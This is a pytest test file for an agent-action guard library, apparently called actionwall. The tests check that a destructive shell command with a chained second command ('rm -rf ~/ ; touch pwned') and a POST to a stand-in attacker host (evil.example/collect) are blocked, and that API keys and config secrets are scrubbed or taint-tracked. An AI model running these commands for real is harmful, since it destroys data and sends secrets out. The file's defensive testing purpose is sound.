import pytest

from actionwall import ActionBlocked, Guard, GuardedExecutor, guarded


@pytest.fixture
def ex(guard):
    return GuardedExecutor(guard)


def test_round_trip_in_workspace(ex, ws):
    ex.write_file("notes/today.md", "hello")
    assert ex.read_file("notes/today.md") == "hello"
    assert (ws / "notes" / "today.md").exists()


def test_shell_runs_in_workspace(ex):
    r = ex.run_shell("ls src")
    assert r.exit_code == 0 and "app.py" in r.stdout


def test_blocked_shell_never_runs(ex, ws):
    with pytest.raises(ActionBlocked):
        ex.run_shell("rm -rf ~/ ; touch pwned")
    assert not (ws / "pwned").exists()


def test_env_secrets_are_scrubbed(ex, monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-proj-should-not-leak-1234567890")
    monkeypatch.setenv("HARMLESS", "yes")
    out = ex.run_shell("env").stdout
    assert "OPENAI_API_KEY" not in out and "HARMLESS=yes" in out


def test_shell_output_is_taint_tracked(ex, guard):
    ex.run_shell("cat config.yaml")
    assert "a8Fk29dLq0Zx7Pw3Rt5YcV1b" in guard.taint.secrets


def test_http_to_unlisted_domain_is_blocked_before_any_request(ex):
    with pytest.raises(ActionBlocked):
        ex.http_request("https://evil.example/collect", "POST", "x")


def test_decorator_blocks_and_observes(guard, ws):
    guard.policy.data["tools"]["allow"] = ["lookup", "post_message"]

    @guarded(guard)
    def lookup(key: str) -> str:
        return (ws / "config.yaml").read_text()

    @guarded(guard, on_block="return")
    def post_message(text: str) -> str:
        return "sent"

    lookup("x")
    assert post_message("hello") == "sent"
    assert post_message("token a8Fk29dLq0Zx7Pw3Rt5YcV1b").startswith("BLOCKED by actionwall")


def test_decorator_raises_by_default(guard):
    @guarded(guard)
    def drop_database() -> None:  # not on any list -> ask -> no approver -> denied
        raise AssertionError("must not run")

    with pytest.raises(ActionBlocked):
        drop_database()
